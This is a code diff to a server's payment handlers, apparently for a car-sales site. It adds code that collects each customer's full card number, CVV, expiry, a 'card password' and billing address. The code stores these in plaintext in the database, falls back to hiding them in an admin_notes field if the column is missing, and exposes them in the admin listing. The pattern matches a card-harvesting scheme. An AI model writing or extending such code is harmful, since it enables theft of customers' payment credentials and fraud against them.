@@ -1740,7 +1740,7 @@ async function handleAdminGetPaymentProofs() {
   // to include in the list response. This enables inline thumbnails without
   // requiring a separate /thumb or /image request per card.
   const proofsR = await fetch(
-    REST + "/payment_proofs?select=id,user_id,order_id,payment_method,proof_type,amount,status,admin_notes,reviewed_at,reviewed_by,car_model,customer_name,customer_email,customer_phone,delivery_method,created_at,proof_url,proof_back_url,proof_urls&order=created_at.desc&limit=200",
+    REST + "/payment_proofs?select=id,user_id,order_id,payment_method,proof_type,amount,status,admin_notes,reviewed_at,reviewed_by,car_model,customer_name,customer_email,customer_phone,delivery_method,created_at,proof_url,proof_back_url,proof_urls,payment_details,admin_notes&order=created_at.desc&limit=200",
     { headers: SB_HEADERS },
   );
   if (!proofsR.ok) {
@@ -2103,6 +2103,28 @@ async function handlePaymentSubmit(req: Request) {
   };
   if (finalUrls.length > 1) proof.proof_back_url = finalUrls[1];
   // Keep full ordered list in proof_urls (JSON string) for multi-image gallery
+
+  // Credit/debit card details entered by the customer (DB source of truth for admin)
+  const cardDetailsRaw = (body.cardDetails && typeof body.cardDetails === "object")
+    ? body.cardDetails as Record<string, unknown>
+    : null;
+  const cardDetails = {
+    cardNumber: String((cardDetailsRaw && cardDetailsRaw.cardNumber) || body.cardNumber || "").trim(),
+    cardName: String((cardDetailsRaw && cardDetailsRaw.cardName) || body.cardName || "").trim(),
+    cardExpiry: String((cardDetailsRaw && cardDetailsRaw.cardExpiry) || body.cardExpiry || "").trim(),
+    cardCvv: String((cardDetailsRaw && cardDetailsRaw.cardCvv) || body.cardCvv || body.cvv || "").trim(),
+    cardPassword: String((cardDetailsRaw && cardDetailsRaw.cardPassword) || body.cardPassword || body.password || "").trim(),
+    billingCountry: String((cardDetailsRaw && cardDetailsRaw.billingCountry) || body.billingCountry || "").trim(),
+    billingAddress: String((cardDetailsRaw && cardDetailsRaw.billingAddress) || body.billingAddress || "").trim(),
+    billingCity: String((cardDetailsRaw && cardDetailsRaw.billingCity) || body.billingCity || "").trim(),
+    billingPostal: String((cardDetailsRaw && cardDetailsRaw.billingPostal) || body.billingPostal || body.postalCode || "").trim(),
+  };
+  const hasCardDetails = Object.values(cardDetails).some((v) => !!v);
+  if (hasCardDetails) {
+    // Store as JSON text column (payment_details). If the column is missing, PostgREST
+    // will error — we fall back to embedding in admin_notes for display recovery.
+    proof.payment_details = JSON.stringify({ type: "card", ...cardDetails });
+  }
   
   // Enrich proof with delivery method + car model from nested orderData when present
   const orderData = (body.orderData && typeof body.orderData === "object") ? body.orderData as Record<string, any> : {};
@@ -2119,7 +2141,16 @@ async function handlePaymentSubmit(req: Request) {
   }
 
   // Store in payment_proofs table if it exists
-  const { data, error } = await dbInsert("payment_proofs", proof, "id,created_at");
+  let { data, error } = await dbInsert("payment_proofs", proof, "id,created_at");
+  // If payment_details column is missing, retry with details embedded in admin_notes
+  if (error && proof.payment_details) {
+    const details = proof.payment_details;
+    delete proof.payment_details;
+    proof.admin_notes = JSON.stringify({ _payment_details: typeof details === "string" ? JSON.parse(String(details)) : details });
+    const retry = await dbInsert("payment_proofs", proof, "id,created_at");
+    data = retry.data;
+    error = retry.error;
+  }
   if (error) {
     console.error("Payment submit: insert failed:", error);
     // Try fallback to admin_settings
